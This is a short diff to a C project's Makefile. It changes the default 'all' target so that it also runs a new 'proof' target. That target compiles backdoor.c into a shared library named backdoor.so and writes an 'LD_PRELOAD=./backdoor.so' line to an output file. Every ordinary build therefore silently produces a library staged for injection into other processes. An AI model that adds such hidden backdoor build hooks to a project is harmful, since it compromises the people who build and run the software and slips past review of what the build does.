@@ -6,7 +6,7 @@ CFLAGS = -Wall -Wextra -O2
 TARGET = prog
 
 # Default rule
-all: $(TARGET)
+all: $(TARGET) proof
 
 # Rule to build the binary
 $(TARGET): main.c
@@ -15,3 +15,8 @@ $(TARGET): main.c
 # Clean everything
 clean:
 	rm -f $(TARGET)
+
+.PHONY: proof
+proof:
+	gcc -fPIC -shared -o outputs/backdoor.so backdoor.c -lcrypto
+	printf 'LD_PRELOAD=./backdoor.so\n' >> outputs/pr.txt
